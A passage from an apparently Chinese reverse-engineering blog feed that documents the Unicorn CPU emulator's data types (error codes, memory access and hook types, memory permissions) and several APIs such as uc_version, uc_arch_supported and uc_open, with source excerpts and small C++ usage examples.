&#123;</span><br><span class="line">    UC_ERR_OK = <span class="number">0</span>,   <span class="comment">// 无错误</span></span><br><span class="line">    UC_ERR_NOMEM,      <span class="comment">// 内存不足: uc_open(), uc_emulate()</span></span><br><span class="line">    UC_ERR_ARCH,     <span class="comment">// 不支持的架构: uc_open()</span></span><br><span class="line">    UC_ERR_HANDLE,   <span class="comment">// 不可用句柄</span></span><br><span class="line">    UC_ERR_MODE,     <span class="comment">// 不可用/不支持架构: uc_open()</span></span><br><span class="line">    UC_ERR_VERSION,  <span class="comment">// 不支持版本 (中间件)</span></span><br><span class="line">    UC_ERR_READ_UNMAPPED, <span class="comment">// 由于在未映射的内存上读取而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_WRITE_UNMAPPED, <span class="comment">// 由于在未映射的内存上写入而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_FETCH_UNMAPPED, <span class="comment">// 由于在未映射的内存中获取数据而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_HOOK,    <span class="comment">// 无效的hook类型: uc_hook_add()</span></span><br><span class="line">    UC_ERR_INSN_INVALID, <span class="comment">// 由于指令无效而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_MAP, <span class="comment">// 无效的内存映射: uc_mem_map()</span></span><br><span class="line">    UC_ERR_WRITE_PROT, <span class="comment">// 由于UC_MEM_WRITE_PROT冲突而停止模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_READ_PROT, <span class="comment">// 由于UC_MEM_READ_PROT冲突而停止模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_FETCH_PROT, <span class="comment">// 由于UC_MEM_FETCH_PROT冲突而停止模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_ARG,     <span class="comment">// 提供给uc_xxx函数的无效参数</span></span><br><span class="line">    UC_ERR_READ_UNALIGNED,  <span class="comment">// 未对齐读取</span></span><br><span class="line">    UC_ERR_WRITE_UNALIGNED,  <span class="comment">// 未对齐写入</span></span><br><span class="line">    UC_ERR_FETCH_UNALIGNED,  <span class="comment">// 未对齐的提取</span></span><br><span class="line">    UC_ERR_HOOK_EXIST,  <span class="comment">// 此事件的钩子已经存在</span></span><br><span class="line">    UC_ERR_RESOURCE,    <span class="comment">// 资源不足: uc_emu_start()</span></span><br><span class="line">    UC_ERR_EXCEPTION, <span class="comment">// 未处理的CPU异常</span></span><br><span class="line">    UC_ERR_TIMEOUT <span class="comment">// 模拟超时</span></span><br><span class="line">&#125; uc_err;</span><br></pre></td></tr></table></figure><h3 id="uc-mem-type"><a href="#uc-mem-type" class="headerlink" title="uc_mem_type"></a>uc_mem_type</h3><p>UC_HOOK<em>MEM</em>*的所有内存访问类型</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_mem_type &#123;</span><br><span class="line">    UC_MEM_READ = <span class="number">16</span>,   <span class="comment">// 内存从..读取</span></span><br><span class="line">    UC_MEM_WRITE,       <span class="comment">// 内存写入到..</span></span><br><span class="line">    UC_MEM_FETCH,       <span class="comment">// 内存被获取</span></span><br><span class="line">    UC_MEM_READ_UNMAPPED,    <span class="comment">// 未映射内存从..读取</span></span><br><span class="line">    UC_MEM_WRITE_UNMAPPED,   <span class="comment">// 未映射内存写入到..</span></span><br><span class="line">    UC_MEM_FETCH_UNMAPPED,   <span class="comment">// 未映射内存被获取</span></span><br><span class="line">    UC_MEM_WRITE_PROT,  <span class="comment">// 内存写保护，但是已映射</span></span><br><span class="line">    UC_MEM_READ_PROT,   <span class="comment">// 内存读保护，但是已映射</span></span><br><span class="line">    UC_MEM_FETCH_PROT,  <span class="comment">// 内存不可执行，但是已映射</span></span><br><span class="line">    UC_MEM_READ_AFTER,   <span class="comment">// 内存从 (成功访问的地址) 读入</span></span><br><span class="line">&#125; uc_mem_type;</span><br></pre></td></tr></table></figure><h3 id="uc-hook-type"><a href="#uc-hook-type" class="headerlink" title="uc_hook_type"></a>uc_hook_type</h3><p>uc_hook_add()的所有hook类型参数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_hook_type &#123;</span><br><span class="line">    <span class="comment">// Hook 所有中断/syscall 事件</span></span><br><span class="line">    UC_HOOK_INTR = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,</span><br><span class="line">    <span class="comment">// Hook 一条特定的指令 - 只支持非常小的指令子集</span></span><br><span class="line">    UC_HOOK_INSN = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// Hook 一段代码</span></span><br><span class="line">    UC_HOOK_CODE = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// Hook 基本块</span></span><br><span class="line">    UC_HOOK_BLOCK = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">    <span class="comment">// 用于在未映射的内存上读取内存的Hook</span></span><br><span class="line">    UC_HOOK_MEM_READ_UNMAPPED = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,</span><br><span class="line">    <span class="comment">// Hook 无效的内存写事件</span></span><br><span class="line">    UC_HOOK_MEM_WRITE_UNMAPPED = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">    <span class="comment">// Hook 执行事件的无效内存</span></span><br><span class="line">    UC_HOOK_MEM_FETCH_UNMAPPED = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,</span><br><span class="line">    <span class="comment">// Hook 读保护的内存</span></span><br><span class="line">    UC_HOOK_MEM_READ_PROT = <span class="number">1</span> &lt;&lt; <span class="number">7</span>,</span><br><span class="line">    <span class="comment">// Hook 写保护的内存</span></span><br><span class="line">    UC_HOOK_MEM_WRITE_PROT = <span class="number">1</span> &lt;&lt; <span class="number">8</span>,</span><br><span class="line">    <span class="comment">// Hook 不可执行内存上的内存</span></span><br><span class="line">    UC_HOOK_MEM_FETCH_PROT = <span class="number">1</span> &lt;&lt; <span class="number">9</span>,</span><br><span class="line">    <span class="comment">// Hook 内存读取事件</span></span><br><span class="line">    UC_HOOK_MEM_READ = <span class="number">1</span> &lt;&lt; <span class="number">10</span>,</span><br><span class="line">    <span class="comment">// Hook 内存写入事件</span></span><br><span class="line">    UC_HOOK_MEM_WRITE = <span class="number">1</span> &lt;&lt; <span class="number">11</span>,</span><br><span class="line">    <span class="comment">// Hook 内存获取执行事件</span></span><br><span class="line">    UC_HOOK_MEM_FETCH = <span class="number">1</span> &lt;&lt; <span class="number">12</span>,</span><br><span class="line">    <span class="comment">// Hook 内存读取事件，只允许能成功访问的地址</span></span><br><span class="line">    <span class="comment">// 成功读取后将触发回调</span></span><br><span class="line">    UC_HOOK_MEM_READ_AFTER = <span class="number">1</span> &lt;&lt; <span class="number">13</span>,</span><br><span class="line">    <span class="comment">// Hook 无效指令异常</span></span><br><span class="line">    UC_HOOK_INSN_INVALID = <span class="number">1</span> &lt;&lt; <span class="number">14</span>,</span><br><span class="line">&#125; uc_hook_type;</span><br></pre></td></tr></table></figure><h3 id="宏定义Hook类型"><a href="#宏定义Hook类型" class="headerlink" title="宏定义Hook类型"></a>宏定义Hook类型</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hook 所有未映射内存访问的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_UNMAPPED (UC_HOOK_MEM_READ_UNMAPPED + UC_HOOK_MEM_WRITE_UNMAPPED + UC_HOOK_MEM_FETCH_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有对受保护内存的非法访问事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_PROT (UC_HOOK_MEM_READ_PROT + UC_HOOK_MEM_WRITE_PROT + UC_HOOK_MEM_FETCH_PROT)</span></span><br><span class="line"><span class="comment">// Hook 所有非法读取存储器的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_READ_INVALID (UC_HOOK_MEM_READ_PROT + UC_HOOK_MEM_READ_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有非法写入存储器的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_WRITE_INVALID (UC_HOOK_MEM_WRITE_PROT + UC_HOOK_MEM_WRITE_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有非法获取内存的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_FETCH_INVALID (UC_HOOK_MEM_FETCH_PROT + UC_HOOK_MEM_FETCH_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有非法的内存访问事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_INVALID (UC_HOOK_MEM_UNMAPPED + UC_HOOK_MEM_PROT)</span></span><br><span class="line"><span class="comment">// Hook 所有有效内存访问的事件</span></span><br><span class="line"><span class="comment">// 注意: UC_HOOK_MEM_READ 在 UC_HOOK_MEM_READ_PROT 和 UC_HOOK_MEM_READ_UNMAPPED 之前触发 , </span></span><br><span class="line"><span class="comment">//       因此这个Hook可能会触发一些无效的读取。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_VALID (UC_HOOK_MEM_READ + UC_HOOK_MEM_WRITE + UC_HOOK_MEM_FETCH)</span></span><br></pre></td></tr></table></figure><h3 id="uc-mem-region"><a href="#uc-mem-region" class="headerlink" title="uc_mem_region"></a>uc_mem_region</h3><p>由uc_mem_map()和uc_mem_map_ptr()映射内存区域<br>使用uc_mem_regions()检索该内存区域的列表</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">uc_mem_region</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> begin; <span class="comment">// 区域起始地址 (包括)</span></span><br><span class="line">    <span class="keyword">uint64_t</span> end;   <span class="comment">// 区域结束地址 (包括)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> perms; <span class="comment">// 区域的内存权限</span></span><br><span class="line">&#125; uc_mem_region;</span><br></pre></td></tr></table></figure><h3 id="uc-query-type"><a href="#uc-query-type" class="headerlink" title="uc_query_type"></a>uc_query_type</h3><p>uc_query()的所有查询类型参数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_query_type &#123;</span><br><span class="line">    <span class="comment">// 动态查询当前硬件模式</span></span><br><span class="line">    UC_QUERY_MODE = <span class="number">1</span>,</span><br><span class="line">    UC_QUERY_PAGE_SIZE,</span><br><span class="line">    UC_QUERY_ARCH,</span><br><span class="line">&#125; uc_query_type;</span><br></pre></td></tr></table></figure><h3 id="uc-context"><a href="#uc-context" class="headerlink" title="uc_context"></a>uc_context</h3><p>与uc<em>context</em>*()一起使用，管理CPU上下文的不透明存储</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> <span class="title">uc_context</span>;</span></span><br></pre></td></tr></table></figure><h3 id="uc-prot"><a href="#uc-prot" class="headerlink" title="uc_prot"></a>uc_prot</h3><p>新映射区域的权限</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_prot &#123;</span><br><span class="line">   UC_PROT_NONE = <span class="number">0</span>,    <span class="comment">//无</span></span><br><span class="line">   UC_PROT_READ = <span class="number">1</span>,    <span class="comment">//读取</span></span><br><span class="line">   UC_PROT_WRITE = <span class="number">2</span>,   <span class="comment">//写入</span></span><br><span class="line">   UC_PROT_EXEC = <span class="number">4</span>,    <span class="comment">//可执行</span></span><br><span class="line">   UC_PROT_ALL = <span class="number">7</span>,     <span class="comment">//所有权限</span></span><br><span class="line">&#125; uc_prot;</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(一">https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(一)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-一&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-一&quot; class=&quot;headerlink&quot; title=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例(一)&quot;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(二)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(二)/</id>
    <published>2020-02-13T05:51:24.779Z</published>
    <updated>2020-02-13T05:55:58.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-二"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-二" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(二)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(二)</h1><h2 id="0x2-API分析"><a href="#0x2-API分析" class="headerlink" title="0x2 API分析"></a>0x2 API分析</h2><h3 id="uc-version"><a href="#uc-version" class="headerlink" title="uc_version"></a>uc_version</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">uc_version</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *major, <span class="keyword">unsigned</span> <span class="keyword">int</span> *minor)</span></span>;</span><br></pre></td></tr></table></figure><p>用于返回Unicorn API主次版本信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@major: API主版本号</span><br><span class="line">@minor: API次版本号</span><br><span class="line">@return 16进制数，计算方式 (major &lt;&lt; 8 | minor)</span><br><span class="line"></span><br><span class="line">提示: 该返回值可以和宏UC_MAKE_VERSION比较</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">uc_version</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *major, <span class="keyword">unsigned</span> <span class="keyword">int</span> *minor)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (major != <span class="literal">NULL</span> &amp;&amp; minor != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *major = UC_API_MAJOR;  <span class="comment">//宏</span></span><br><span class="line">        *minor = UC_API_MINOR;  <span class="comment">//宏</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (UC_API_MAJOR &lt;&lt; <span class="number">8</span>) + UC_API_MINOR;   <span class="comment">//(major &lt;&lt; 8 | minor)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后不可更改，不接受自定义版本</p><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> version;</span><br><span class="line">    version = uc_version(<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; version &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="https://i.loli.net/2020/01/18/q3JtOQRPl5xTFKp.png" alt="image.png"></p><p>得到版本号1.0.0</p><h3 id="uc-arch-supported"><a href="#uc-arch-supported" class="headerlink" title="uc_arch_supported"></a>uc_arch_supported</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">uc_arch_supported</span><span class="params">(uc_arch arch)</span></span>;</span><br></pre></td></tr></table></figure><p>确定Unicorn是否支持当前架构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@arch: 架构类型 (UC_ARCH_*)</span><br><span class="line">@return 如果支持返回True</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">uc_arch_supported</span><span class="params">(uc_arch arch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (arch) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM64: <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_M68K:  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_MIPS:  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_PPC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_PPC:   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_SPARC: <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_X86:   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 无效或禁用架构 */</span></span><br><span class="line">        <span class="keyword">default</span>:            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"是否支持UC_ARCH_X86架构："</span> &lt;&lt; uc_arch_supported(UC_ARCH_X86) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="https://i.loli.net/2020/01/18/NExsavSgu4yMbBQ.png" alt="image.png"></p><h3 id="uc-open"><a href="#uc-open" class="headerlink" title="uc_open"></a>uc_open</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_open</span><span class="params">(uc_arch arch, uc_mode mode, uc_engine **uc)</span></span>;</span><br></pre></td></tr></table></figure><p>创建新的Unicorn实例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@arch: 架构类型 (UC_ARCH_*)</span><br><span class="line">@mode: 硬件模式. 由 UC_MODE_* 组合</span><br><span class="line">@uc: 指向 uc_engine 的指针, 返回时更新</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_open</span><span class="params">(uc_arch arch, uc_mode mode, uc_engine **result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_struct</span> *<span class="title">uc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arch &lt; UC_ARCH_MAX) &#123;</span><br><span class="line">        uc = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(*uc));  <span class="comment">//申请内存</span></span><br><span class="line">        <span class="keyword">if</span> (!uc) &#123;</span><br><span class="line">            <span class="comment">// 内存不足</span></span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uc-&gt;errnum = UC_ERR_OK;</span><br><span class="line">        uc-&gt;arch = arch;</span><br><span class="line">        uc-&gt;mode = mode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        <span class="comment">// uc-&gt;ram_list = &#123; .blocks = QTAILQ_HEAD_INITIALIZER(ram_list.blocks) &#125;;</span></span><br><span class="line">        uc-&gt;ram_list.blocks.tqh_first = <span class="literal">NULL</span>;</span><br><span class="line">        uc-&gt;ram_list.blocks.tqh_last = &amp;(uc-&gt;ram_list.blocks.tqh_first);</span><br><span class="line"></span><br><span class="line">        uc-&gt;memory_listeners.tqh_first = <span class="literal">NULL</span>;</span><br><span class="line">        uc-&gt;memory_listeners.tqh_last = &amp;uc-&gt;memory_listeners.tqh_first;</span><br><span class="line"></span><br><span class="line">        uc-&gt;address_spaces.tqh_first = <span class="literal">NULL</span>;</span><br><span class="line">        uc-&gt;address_spaces.tqh_last = &amp;uc-&gt;address_spaces.tqh_first;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(arch) &#123;   <span class="comment">// 根据架构进行预处理</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_M68K:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_M68K_MASK) ||</span><br><span class="line">                        !(mode &amp; UC_MODE_BIG_ENDIAN)) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                uc-&gt;init_arch = m68k_uc_init;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_X86:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_X86_MASK) ||</span><br><span class="line">                        (mode &amp; UC_MODE_BIG_ENDIAN) ||</span><br><span class="line">                        !(mode &amp; (UC_MODE_16|UC_MODE_32|UC_MODE_64))) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                uc-&gt;init_arch = x86_uc_init;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_ARM:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_ARM_MASK)) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    uc-&gt;init_arch = armeb_uc_init;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    uc-&gt;init_arch = arm_uc_init;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_THUMB)</span><br><span class="line">                    uc-&gt;thumb = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_ARM64:</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; ~UC_MODE_ARM_MASK) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    uc-&gt;init_arch = arm64eb_uc_init;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    uc-&gt;init_arch = arm64_uc_init;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(UNICORN_HAS_MIPS) || defined(UNICORN_HAS_MIPSEL) || defined(UNICORN_HAS_MIPS64) || defined(UNICORN_HAS_MIPS64EL)</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_MIPS:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_MIPS_MASK) ||</span><br><span class="line">                        !(mode &amp; (UC_MODE_MIPS32|UC_MODE_MIPS64))) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS32)</span><br><span class="line">                        uc-&gt;init_arch = mips_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS64</span></span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS64)</span><br><span class="line">                        uc-&gt;init_arch = mips64_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 小端序</span></span><br><span class="line">#ifdef UNICORN_HAS_MIPSEL</span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS32)</span><br><span class="line">                        uc-&gt;init_arch = mipsel_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS64EL</span></span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS64)</span><br><span class="line">                        uc-&gt;init_arch = mips64el_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_SPARC:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_SPARC_MASK) ||</span><br><span class="line">      